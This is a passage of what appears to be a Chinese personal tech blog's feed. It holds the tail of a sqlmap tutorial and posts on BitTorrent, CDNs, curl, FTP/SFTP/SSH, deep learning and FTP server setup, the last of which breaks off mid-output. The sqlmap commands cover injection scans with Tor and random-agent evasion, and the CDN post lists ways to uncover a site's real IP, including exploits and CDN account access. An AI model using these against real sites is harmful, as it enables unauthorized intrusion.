sqlmap.py -u www.example.com --level 5  <span class="comment"># 使用5级注入，检测host注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --random-agent     <span class="comment"># 使用随机代理</span></span><br><span class="line">python sqlmap.py -u www.example.com --tor  <span class="comment"># 使用匿名tor网络</span></span><br><span class="line">python sqlmap.py -u www.example.com --hpp  <span class="comment"># 检测http污染</span></span><br></pre></td></tr></table></figure><p>level默认为1，范围为 1 - 5</p><p><strong>更多用法和命令可参照官网文档：<a href="http://sqlmap.org/">http://sqlmap.org/</a></strong></p><blockquote><p>quote<br><a href="https://github.com/sqlmapproject/sqlmap">GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool</a></p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap</a></p><p><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关BT种子的一些事</title>
      <link href="2022/03/27/bit_torrent/"/>
      <url>2022/03/27/bit_torrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Bit-Torrent-BT种子-是什么？"><a href="#Bit-Torrent-BT种子-是什么？" class="headerlink" title="Bit Torrent (BT种子)是什么？"></a>Bit Torrent (BT种子)是什么？</h2><blockquote><p>BitTorrent(简称BT)是一个文件分发协议，每个下载者在下载的同时不断向其他下载者上传已下载的数据。而在<a href="https://baike.baidu.com/item/FTP/13839">FTP</a>,<a href="https://baike.baidu.com/item/HTTP">HTTP</a>协议中，每个下载者在下载自己所需文件的同时，各个下载者之间没有交互。当非常多的用户同时访问和下载服务器上的文件时，由于FTP服务器处理能力和带宽的限制，下载速度会急剧下降，有的用户可能访问不了服务器。BT协议与FTP协议不同，特点是下载的人越多，下载速度越快，原因在于每个下载者将已下载的数据提供给其他下载者下载，充分利用了用户的上载带宽。通过一定的策略保证上传速度越快，下载速度也越快。在很短时间内，BitTorrent协议成为一种新的变革技术。</p></blockquote><p>以上说明来自百度百科</p><p><a href="https://www.helloimg.com/image/RexTrb"><img src="https://www.helloimg.com/images/2022/03/27/RexTrb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/27/RexTrb.png" srcset="data:image/png;base64,666" alt="RexTrb.png"></a></p><p>用通俗的话讲，BT种子（以下简称 种子 ）技术其实就是将一个比较大的文件（比如电影或镜像）按照一定的规范分成多个块，当用户通过.torrent文件下载时，会连接上种子文件中记录的tracker服务器，而tracker服务器并不提供文件本身，而是通过查询返回当前同在下载该文件的其他客户端的地址，而主机接收到该地址后，会逐个逐个尝试连接，连接成功的便通过点对点（P2P）的方式获取对方计算机上的另一部分文件，然后再连接其他的客户端，获取文件的其他部分</p><h2 id="Bit-Torrent-与其他下载方式相比，有什么优势？"><a href="#Bit-Torrent-与其他下载方式相比，有什么优势？" class="headerlink" title="Bit Torrent 与其他下载方式相比，有什么优势？"></a>Bit Torrent 与其他下载方式相比，有什么优势？</h2><p>不同于传统的 C/S ( Client / Server )模式，P2P的下载方式避免了单个服务器提供多个客户端的服务时带宽负载大的问题；在P2P下载时，每一台计算机，既是客户端，又是服务端，在下载的过程中，也向其他有需要的客户端上传自己的文件，有效节省了带宽；</p><p>另外，由于P2P去中心化的特点，每个处于BT网络中的文件，其存在与否不再取决于文件的提供者或服务商，在一定程度上避免了文件因个人过失而永久消失的情况</p><h2 id="Bit-Torrent-与其他下载方式相比，有什么劣势？"><a href="#Bit-Torrent-与其他下载方式相比，有什么劣势？" class="headerlink" title="Bit Torrent 与其他下载方式相比，有什么劣势？"></a>Bit Torrent 与其他下载方式相比，有什么劣势？</h2><p>有优势就肯定有劣势，如上文所说，BT下载是通过同在下载该文件的其他客户端提供的服务来获取文件的，那么，当同时在下载该文件的客户端很少，甚至我们可以假设一种极端情况：整个网络就只有你一台计算机在下载该文件，那么你将不会得到你想要的文件，因为没有其他节点给你提供你想要的文件</p><p>另一方面，同样由于BT技术中文件无法轻易清除的特点，文件一旦上传，想永久抹去的可能性不大，那么万一有不法分子上传了本不该出现在网络上的文件（比如有关国家机密或者个人隐私，有或者未上映的电影之类的），其后果不堪设想</p><h2 id="torrent文件都记录了什么？"><a href="#torrent文件都记录了什么？" class="headerlink" title="torrent文件都记录了什么？"></a>torrent文件都记录了什么？</h2><p>A）这个文件（文件夹）中数据的SHA1值，比如一个1G的文件，如果按1M每块进行分块，则会被分为了1000块，torrent中就会有这1000个数据块的指纹值（SHA1的<a href="https://www.zhihu.com/search?q=hash%E5%80%BC&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:160765176%7D">hash值</a>），这个占据了torrent文件的绝大部分空间。这些值的目的是为了下载的过程中进行数据校验，确保数据收到的和当时源头制作torrent时的源文件100%一致，防止恶意数据攻击。</p><p>B）一般制作torrent文件时，还会要指定一个或者多个Tracker的地址，比如<a href="https://link.zhihu.com/?target=http://www.a.com:8080/announce">http://www.a.com:8080/announce</a>这种地址。torrent里面一般也会存储了这个信息，这个其实也尤为重要。相当于记录了一个问询服务器的地址，这个问询服务器的作用，后面我再解释。</p><p>C）文件或者文件夹内每个文件的名字，方便下载文件时，磁盘上直接命名好跟原始数据一样的目录结构、文件名。    </p><p>D）其它一些辅助和可扩展的信息，比如可以配置一个P2SP的http地址辅助下载，比如制作软件的名字、备注……。      E）上面信息生成后，torrent会把A）里面的这些信息，以及torrent里面的文件名等关键信息，再进行一次Hash，生成一个新的SHA1值，作为torrent的HASH值，也就是我们经常看到的下载软件里面对这个种子命名的一个唯一的hash值，也有的在magnet这种磁力链接中可以看到这个值，这就是torrent的唯一标记。</p><p>以上就是.torrent文件的内容，可以用记事本打开，但可能看到乱码。这个文件的编码遵循了bencode编码规则。但实际内容就主要是上面这些。所以，torrent可以理解为对原始数据的一些记录。</p><h2 id="如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？"><a href="#如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？" class="headerlink" title="如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？"></a>如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？</h2><p>不一定，BT发明者提出了DHT（Distributed Hash Table）的概念，就算Tracker连不上了，也可以通过分布式哈希表DHT技术，通过DHT网络慢慢的寻找志同道合的邻居节点，只是没有Tracker那么直接那么快速，但慢一些总还是有机会找到邻居的</p><h2 id="有关下载过程中的一些事"><a href="#有关下载过程中的一些事" class="headerlink" title="有关下载过程中的一些事"></a>有关下载过程中的一些事</h2><p>文件下载时，若存在提供下载服务的http服务器，那么就算没有其他的客户端在线，下载仍然可以进行</p><p>下载过程中出现卡在99.99%的原因是因为当所有分块都下载完毕时，电脑会对下载的文件进行文件校验（类似于哈希检验），而当文件校验不通过时，电脑就会对组成文件的所有分块逐个逐个进行检验，发现校验值不对的文件分块再重新下载，这就是为什么有时候下载卡住的原因</p><p>当文件下载完毕时，如果你没有关闭下载文件的客户端，那么如果有其他人需要你的文件，即使你没有在下载文件，你所拥有的文件分块依然可以上传给其他客户端，成为一名崇高的传递者</p><p>文件下载时，影响下载速度的，除了你的电脑当前的网速，其实还有你的电脑当前的上传速度；在BT网络的带宽分配中，上传速度快的客户端能够获得的下载速度会相对比较快</p><p>某些运营商会对BT下载时的通信进行拦截，它们会对通信过程中传输的内容进行分析，由于早期的下载传输的是明文，故很容易就能够被运营商截取；当然，道高一尺，魔高一丈，如今的下载过程传输的内容大部分都进行过加密</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/BitTorrent/142795">BitTorrent_百度百科 (baidu.com)</a></p><p><a href="https://www.zhihu.com/question/49829233/answer/160765176">https://www.zhihu.com/question/49829233/answer/160765176</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关cdn和真实ip的一些事</title>
      <link href="2022/03/20/cdn/"/>
      <url>2022/03/20/cdn/</url>
      
        <content type="html"><![CDATA[<h2 id="CDN是什么？"><a href="#CDN是什么？" class="headerlink" title="CDN是什么？"></a>CDN是什么？</h2><blockquote><p>CDN(Content Delivery Network)是指内容分发网络，也称为内容传送网络，这个概念始于1996年，是美国麻省理工学院的一个研究小组为改善互联网的服务质量而提出的。为了能在传统IP网上发布丰富的宽带媒体内容，他们提出在现有互联网基础上建立一个内容分发平台专门为网站提供服务，并于1999年成立了专门的CDN服务公司，为Yahoo提供专业服务。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。</p></blockquote><p>以上是来自百度百科的解释<br>个人理解，通俗点说，cdn其实就是一些服务器，将你的一些静态文件（html）什么的复制一份，然后等有人访问网站的时候再就近选择cdn服务器把你的那些静态页面返回，这样就不用通过你的服务器，从而减轻带宽负载了</p><h2 id="CDN和IP是什么关系？"><a href="#CDN和IP是什么关系？" class="headerlink" title="CDN和IP是什么关系？"></a>CDN和IP是什么关系？</h2><p>由于用户获取静态文件时大概率会由CDN服务器返回，则大多数情况下用户输入域名访问网站时，实际进行通信的很可能不是该网站真实的IP，而是CDN服务器的IP</p><h2 id="CDN的好处有哪些？"><a href="#CDN的好处有哪些？" class="headerlink" title="CDN的好处有哪些？"></a>CDN的好处有哪些？</h2><p>最明显的也是大部分人最需要的，就是减少自家服务器的带宽负载<br>此外还有一个好处，就是隐藏服务器的真实IP（但是不能百分百隐藏）</p><h3 id="CDN隐藏IP的好处是什么？为什么不能完全隐藏？"><a href="#CDN隐藏IP的好处是什么？为什么不能完全隐藏？" class="headerlink" title="CDN隐藏IP的好处是什么？为什么不能完全隐藏？"></a>CDN隐藏IP的好处是什么？为什么不能完全隐藏？</h3><p>隐藏IP最大的好处就是在一定程度上避免自家服务器受到攻击（DDoS攻击之类的），因为不法分子无法知道我们服务器的真实IP，也就无法对该IP进行大量重复的请求从而达到使网站拒绝服务的效果，最多就是把最近的CDN服务器打了下来<br>那天下CDN千千万，你把这个打下来了又有什么用呢？你又不能确保你下一个访问的服务器一定不是CDN</p><h2 id="我怎么知道自己的请求是不是到了CDN呢？"><a href="#我怎么知道自己的请求是不是到了CDN呢？" class="headerlink" title="我怎么知道自己的请求是不是到了CDN呢？"></a>我怎么知道自己的请求是不是到了CDN呢？</h2><p>想知道自己访问的服务器是不是CDN，有几种办法：<br>windows命令行用nslookup命令查询一下目标域名，如果一个域名对应着好几个IP，那十有八九是使用了CDN；当然，如果只返回了一个IP也不能说明目标网站就没有使用CDN<br>在CDN查询网站上查</p><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p></blockquote><p>查子域名：因为大部分站长使用CDN针对的大多是首页等访问量比较大的页面，那么子页面就有可能没有使用CDN，这时候查询子页面返回的结果很有可能就是真实IP<br>漏洞利用：用CTF那套试试。不过不提倡且大部分情况下不合法<br>分析服务器返回的信息：有些网站会有邮件服务或者订阅服务之类的，而这些服务有时并不会使用CDN，通过分析邮件源码就可以得到IP<br>通过国外访问：有些CDN只面向国内的请求，对于不在服务范围的国外请求有可能不会经过CDN而直接访问真实IP<br>直接访问CDN服务器：最直接的方法就是拿到CDN服务器的账户自己上去查</p><h2 id="怎样才能有CDN服务？"><a href="#怎样才能有CDN服务？" class="headerlink" title="怎样才能有CDN服务？"></a>怎样才能有CDN服务？</h2><p>除了花钱买这一最直接的方法之外，还有另外一种能够获得CDN服务的方法，就是在租赁域名的时候很多服务提供商会免费对该域名提供CDN服务，不要白不要</p><p>以下是对我自己网站的CDN查询<br><a href="https://www.helloimg.com/image/RadpUh"><img src="https://www.helloimg.com/images/2022/03/20/RadpUh.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/20/RadpUh.png" srcset="data:image/png;base64,666" alt="RadpUh.png"></a></p><p>最后再说一句，拿到真实IP了也未必能够通过IP访问目标网站</p><blockquote><p>quote<br><a href="https://blog.csdn.net/fly_hps/article/details/98486807">https://blog.csdn.net/fly_hps/article/details/98486807</a><br><a href="https://www.cxybb.com/article/weixin_37104668/115167764">https://www.cxybb.com/article/weixin_37104668/115167764</a><br><a href="https://baike.baidu.com/item/CDN/420951">https://baike.baidu.com/item/CDN/420951</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl的常见用法</title>
      <link href="2022/03/12/curl/"/>
      <url>2022/03/12/curl/</url>
      
        <content type="html"><![CDATA[<p>curl用法：</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">GET请求：</span><br><span class="line">curl https://www.xxx.com</span><br><span class="line"></span><br><span class="line">POST请求：</span><br><span class="line">curl -d key=value https://www.xxx.com</span><br><span class="line"></span><br><span class="line">填写表单：</span><br><span class="line">curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi</span><br><span class="line"></span><br><span class="line">显示信息：</span><br><span class="line">curl -i https://www.xxx.com</span><br><span class="line"></span><br><span class="line">指定USER-AGENT</span><br><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot;</span> https://www.xxx.com</span><br><span class="line">注：若留空则移除User-Agent标头</span><br><span class="line"></span><br><span class="line">跟随重定向：</span><br><span class="line">curl -L https://www.xxx.com</span><br><span class="line">注：curl默认不跟随重定向</span><br><span class="line"></span><br><span class="line">发送cookie：</span><br><span class="line">curl -b <span class="string">&quot;foo=bar&quot;</span> https://www.xxx.com</span><br><span class="line"></span><br><span class="line">url编码：</span><br><span class="line">curl --data-urlencode <span class="string">&quot;xxxxxxx&quot;</span> https://www.xxx.com</span><br><span class="line">注：该方式与-d相近，区别在于是否编码</span><br><span class="line"></span><br><span class="line">保存网页(与wget相似)：</span><br><span class="line">curl -o xxx.html https://www.xxx.com</span><br><span class="line"></span><br><span class="line">用户认证：</span><br><span class="line">curl -u <span class="string">&quot;user:passwd&quot;</span> https://www.xxx.com/login</span><br><span class="line"></span><br><span class="line">输出通信过程：</span><br><span class="line">curl -v https://www.xxx.com</span><br><span class="line"></span><br><span class="line">输出二进制数据：</span><br><span class="line">curl --trace - https://www.xxx.com</span><br><span class="line">注：可配合-o导出</span><br></pre></td></tr></table></figure><blockquote><p>quote<br><a href="https://www.jianshu.com/p/fc0eb6c60816">https://www.jianshu.com/p/fc0eb6c60816</a><br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp,sftp与ssh之间的关系</title>
      <link href="2022/03/06/ftp_sftp_ssh/"/>
      <url>2022/03/06/ftp_sftp_ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="ftp和sftp的区别"><a href="#ftp和sftp的区别" class="headerlink" title="ftp和sftp的区别"></a>ftp和sftp的区别</h2><p>这两种协议都是用于传输文件的，其中sftp是基于ssh的原理<a id="more"></a>开发的</p><blockquote><p>ftp: File Transfer Protocol<br>stfp: Secure File Transfer Protocol / SSH File Transfer Protocol<br>ssh: Secure Shell</p></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img src="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" srcset="data:image/png;base64,666"><br>ftp是明文传输，有两种模式：主动模式和被动模式</p><h4 id="主动模式-Positive-Mode-："><a href="#主动模式-Positive-Mode-：" class="headerlink" title="主动模式(Positive Mode)："></a>主动模式(Positive Mode)：</h4><p><a href="https://www.helloimg.com/image/Gh2qT6"><img src="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" srcset="data:image/png;base64,666" alt="Gh2qT6.png"></a><br><a href="https://www.helloimg.com/image/Gh2s7A"><img src="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" srcset="data:image/png;base64,666" alt="Gh2s7A.png"></a><br>在该模式下，服务端开放21，20端口；21端口用于接收用户名和密码，20端口用于传输数据<br>客户端登录ftp服务器后随机开放一个端口，再将这个端口的信息发送给服务端，服务端再通过用于传输数据的20端口连接至用户提供的端口</p><h4 id="被动模式-Passive-Mode-："><a href="#被动模式-Passive-Mode-：" class="headerlink" title="被动模式(Passive Mode)："></a>被动模式(Passive Mode)：</h4><p><a href="https://www.helloimg.com/image/Gh2mnz"><img src="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" srcset="data:image/png;base64,666" alt="Gh2mnz.png"></a><br><a href="https://www.helloimg.com/image/Gh2JPR"><img src="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" srcset="data:image/png;base64,666" alt="Gh2JPR.png"></a><br>在该模式下，服务端开放用于客户端连接的21端口以及一个随机端口，而客户端在登录ftp服务器后接收服务端提供的随机端口的信息，再连接至服务端的该端口以传输数据</p><h3 id="stfp"><a href="#stfp" class="headerlink" title="stfp"></a>stfp</h3><p><a href="https://www.helloimg.com/image/Gh2eqP"><img src="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" srcset="data:image/png;base64,666" alt="Gh2eqP.jpg"></a></p><blockquote><p>首先要明确的一点是，stfp是ssh的一个子服务</p></blockquote><p><a href="https://www.helloimg.com/image/Gh24C5"><img src="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" srcset="data:image/png;base64,666" alt="Gh24C5.png"></a><br>sftp是基于ssh的技术进行文件的传输的，而ssh是通过22端口进行通信的，也就是说sftp也是通过22端口进行通信以及数据传输的，与ftp协议相比，除了通信端口的不同，由于ssh的通信过程是加密的，所以sftp中文件的传输也是加密的，但实际的安全性还取决于ssh的连接方式；且在ssh服务器与通信主机（服务器）分开时还分有半安全模式(Less Secure Connection)和安全模式(Full Secure Connection)</p><blockquote><p>半安全模式指用户通过ssh连接ssh服务器时所有的数据都是加密的，而ssh服务器与主机间通信的数据是未加密的</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2xUn"><img src="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" srcset="data:image/png;base64,666" alt="Gh2xUn.png"></a></p><blockquote><p>安全模式指用户与ssh服务器以及ssh服务器与主机间的通信都是加密的</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2At0"><img src="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" srcset="data:image/png;base64,666" alt="Gh2At0.png"></a><br>而当ssh服务运行于目标主机上时便不存在半安全模式和安全模式之分了</p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>作为远程连接主机的常用方式，ssh有两种连接方式，一种是通过用户名和密码进行通信，这种方式非常方便，只需要任意一台能够接入互联网的常用设备就能够连接上远程主机，但是这种方式存在受到中间人攻击的可能；另一种方式是通过密钥分发的方式，即在服务端生成一份私钥存于服务器，再生成一份公钥分发给需要通信的主机，这种方式不需要用户名和密码，并且通信时需要进行密钥与公钥的验证，基本杜绝了中间人攻击的可能，但是由于需要提前准备好公钥，故便携性不如第一种方式</p><blockquote><p>quote<br><a href="https://network.51cto.com/article/603552.html">https://network.51cto.com/article/603552.html</a><br><a href="https://www.zhihu.com/question/20402010">https://www.zhihu.com/question/20402010</a><br><a href="https://blog.csdn.net/cuker919/article/details/6403925">https://blog.csdn.net/cuker919/article/details/6403925</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 5</title>
      <link href="2021/12/25/deep_learning_from_scratch_5/"/>
      <url>2021/12/25/deep_learning_from_scratch_5/</url>
      
        <content type="html"><![CDATA[<h3 id="深度学习应用案例"><a href="#深度学习应用案例" class="headerlink" title="深度学习应用案例"></a>深度学习应用案例</h3><a id="more"></a><ul><li><p>物体检测 – R-CNN</p></li><li><p>图像分割 – FCN</p></li><li><p>图像标题的生成 – NIC (CNN+RNN)</p></li><li><p>图像风格变换</p></li><li><p>图像的生成 – DCGAN</p></li><li><p>自动驾驶</p></li><li><p>Dep Q-Network (强化学习)</p></li></ul><h3 id="多模态处理"><a href="#多模态处理" class="headerlink" title="多模态处理"></a>多模态处理</h3><blockquote><p>组合图像和自然语言等多种信息进行的处理</p></blockquote><h3 id="GAN"><a href="#GAN" class="headerlink" title="GAN"></a>GAN</h3><blockquote><p>生成式对抗网络（GAN, Generative Adversarial Networks ）是一种<a href="https://baike.baidu.com/item/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/3729729">深度学习</a><a href="https://baike.baidu.com/item/%E6%A8%A1%E5%9E%8B/1741186">模型</a>，是近年来复杂分布上<a href="https://baike.baidu.com/item/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/810193">无监督学习</a>最具前景的方法之一。模型通过框架中（至少）两个模块：<a href="https://baike.baidu.com/item/%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/6563656">生成模型</a>（Generative Model）和<a href="https://baike.baidu.com/item/%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B/16224017">判别模型</a>（Discriminative Model）的互相博弈学习产生相当好的输出。原始 GAN <a href="https://baike.baidu.com/item/%E7%90%86%E8%AE%BA/1732500">理论</a>中，并不要求 G 和 D 都是神经网络，只需要是能拟合相应生成和判别的函数即可。但实用中一般均使用深度神经网络作为 G 和 D 。 –Baidu Baike</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 4</title>
      <link href="2021/12/18/deep_learning_from_scratch_4/"/>
      <url>2021/12/18/deep_learning_from_scratch_4/</url>
      
        <content type="html"><![CDATA[<h3 id="卷积神经网络与普通机器学习的区别"><a href="#卷积神经网络与普通机器学习的区别" class="headerlink" title="卷积神经网络与普通机器学习的区别"></a>卷积神经网络与普通机器学习的区别</h3><a id="more"></a><blockquote><p>CNN中新出现了卷积层和池化层</p></blockquote><h3 id="全连接层存在的问题"><a href="#全连接层存在的问题" class="headerlink" title="全连接层存在的问题"></a>全连接层存在的问题</h3><p>在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系</p><h3 id="特征图"><a href="#特征图" class="headerlink" title="特征图"></a>特征图</h3><p>卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图</p><h3 id="卷积运算"><a href="#卷积运算" class="headerlink" title="卷积运算"></a>卷积运算</h3><p>卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等</p><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0</p><p>作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要<strong>填充</strong>来调整数据空间大小</p><h3 id="步幅"><a href="#步幅" class="headerlink" title="步幅"></a>步幅</h3><blockquote><p>应用滤波器的位置间隔</p></blockquote><h3 id="3维数据的卷积运算"><a href="#3维数据的卷积运算" class="headerlink" title="3维数据的卷积运算"></a>3维数据的卷积运算</h3><p>与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加</p><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h3><p>池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等</p><p>特征</p><ul><li>没有要学习的参数</li><li>通道数不发生变化</li><li>对微小的位置变化具有鲁棒性（健壮）</li></ul><h3 id="具有代表性的CNN"><a href="#具有代表性的CNN" class="headerlink" title="具有代表性的CNN"></a>具有代表性的CNN</h3><ul><li><p>LeNet</p><p>是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果</p><p>不同点</p><ul><li><p>激活函数不同</p><p>LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数</p></li><li><p>在缩小中间数据的大小时采用的方法不同</p><p>原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化</p></li></ul></li><li><p>AlexNet</p><p>在结构上与LeNet基本没有什么不同</p><p>与LeNet的差异</p><ul><li>激活函数使用ReLU</li><li>使用进行局部正规化的LRN(Local Response Normalization)层</li><li>使用Dropout</li></ul></li></ul><h3 id="Data-Augmentation-数据扩充"><a href="#Data-Augmentation-数据扩充" class="headerlink" title="Data Augmentation(数据扩充)"></a>Data Augmentation(数据扩充)</h3><p>基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量</p><h3 id="加深层的好处"><a href="#加深层的好处" class="headerlink" title="加深层的好处"></a>加深层的好处</h3><ul><li><p>减少网络的参数数量</p><p>与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力</p></li><li><p>使学习更加高效</p><p>随着层的加深，神经元会对更复杂的东西有响应</p></li><li><p>可以分层次地分解需要学习的问题</p></li><li><p>可以分层次地传递信息</p></li></ul><h3 id="感受野-receptive-field"><a href="#感受野-receptive-field" class="headerlink" title="感受野(receptive field)"></a>感受野(receptive field)</h3><p>给神经元施加变化的某个局部空间区域</p><h3 id="ImageNet"><a href="#ImageNet" class="headerlink" title="ImageNet"></a>ImageNet</h3><p>一个拥有超过100万张图像的数据集</p><h3 id="在深度学习中比较知名的网络"><a href="#在深度学习中比较知名的网络" class="headerlink" title="在深度学习中比较知名的网络"></a>在深度学习中比较知名的网络</h3><ul><li>VGG</li><li>GoogLeNet</li><li>ResNet</li></ul><h3 id="深度学习中高速化的问题"><a href="#深度学习中高速化的问题" class="headerlink" title="深度学习中高速化的问题"></a>深度学习中高速化的问题</h3><p>在深度学习中大部分时间都耗费在卷积层上</p><h3 id="基于GPU的高速化"><a href="#基于GPU的高速化" class="headerlink" title="基于GPU的高速化"></a>基于GPU的高速化</h3><p>深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度</p><h3 id="分布式学习"><a href="#分布式学习" class="headerlink" title="分布式学习"></a>分布式学习</h3><p>为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp文件服务器搭建</title>
      <link href="2021/12/16/ftp_server/"/>
      <url>2021/12/16/ftp_server/</url>
      
        <content type="html"><![CDATA[<h2 id="第一步：更新软件列表"><a href="#第一步：更新软件列表" class="headerlink" title="第一步：更新软件列表"></a>第一步：更新软件列表</h2><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt update</span><br><span class="line">[sudo] password for zh: </span><br><span class="line">Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InRelease</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]</span><br><span class="line">Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]</span><br><span class="line">Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]</span><br><span class="line">Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]</span><br><span class="line">Get:6 